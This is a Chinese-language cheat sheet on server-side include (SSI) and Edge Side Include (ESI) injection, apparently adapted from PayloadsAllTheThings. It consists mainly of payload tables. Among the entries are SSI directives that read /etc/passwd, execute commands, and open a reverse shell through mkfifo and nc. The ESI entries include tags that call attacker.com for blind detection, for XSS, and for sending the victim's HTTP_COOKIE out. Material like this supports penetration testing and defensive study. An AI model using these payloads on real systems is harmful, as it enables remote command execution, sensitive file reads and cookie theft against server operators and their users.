# SSI Injection - 服务端包含注入

[SEARCH_KEYWORDS]
漏洞类型: SSI Injection ESI Injection 服务端包含注入 Edge Side Include
攻击类型: Command Execution File Inclusion XSS Information Disclosure
关键词: SSI ESI include exec cmd directive server side
技术: SSI Directive ESI Tag Command Execution File Read
格式: <!--#directive param="value" --> <esi:include src="">

[CONTENT]

## SSI注入概述

服务端包含(SSI)是放置在HTML页面中的指令，在服务器提供页面时进行评估。SSI注入发生在攻击者可以向Web应用程序输入SSI指令时，可能导致执行命令或访问敏感信息。

## SSI指令格式

```html
<!--#directive param="value" -->
```

## SSI Payload

| 描述 | Payload |
|------|---------|
| 打印日期 | `<!--#echo var="DATE_LOCAL" -->` |
| 打印文档名 | `<!--#echo var="DOCUMENT_NAME" -->` |
| 打印所有变量 | `<!--#printenv -->` |
| 设置变量 | `<!--#set var="name" value="Rich" -->` |
| 包含文件 | `<!--#include file="/etc/passwd" -->` |
| 包含文件(虚拟) | `<!--#include virtual="/index.html" -->` |
| 执行命令 | `<!--#exec cmd="ls" -->` |
| 反弹Shell | `<!--#exec cmd="mkfifo /tmp/f;nc IP PORT 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` |

## Edge Side Inclusion (ESI)

HTTP代理无法区分来自上游服务器的真实ESI标签和恶意标签。

### ESI Header

```powershell
Surrogate-Control: content="ESI/1.0"
```

### ESI Payload

| 描述 | Payload |
|------|---------|
| 盲检测 | `<esi:include src=http://attacker.com>` |
| XSS | `<esi:include src=http://attacker.com/XSSPAYLOAD.html>` |
| 窃取Cookie | `<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>` |
| 包含文件 | `<esi:include src="supersecret.txt">` |
| 调试信息 | `<esi:debug/>` |
| 添加头部 | `<!--esi $add_header('Location','http://attacker.com') -->` |
| 内联片段 | `<esi:inline name="/attack.html" fetchable="yes"><script>prompt('XSS')</script></esi:inline>` |

## ESI支持矩阵

| 软件 | Includes | Vars | Cookies | 需要Upstream Headers | Host白名单 |
|------|----------|------|---------|---------------------|------------|
| Squid3 | Yes | Yes | Yes | Yes | No |
| Varnish Cache | Yes | No | No | Yes | Yes |
| Fastly | Yes | No | No | No | Yes |
| Akamai ETS | Yes | Yes | Yes | No | No |
| NodeJS esi | Yes | Yes | Yes | No | No |
| NodeJS nodesi | Yes | No | No | No | Optional |

## 攻击场景

1. **文件读取**：通过include指令读取敏感文件
2. **命令执行**：通过exec cmd执行系统命令
3. **信息泄露**：打印环境变量
4. **SSRF**：通过ESI标签进行服务端请求伪造

## 参考文档

原始来源: PayloadsAllTheThings/Server Side Include Injection/README.md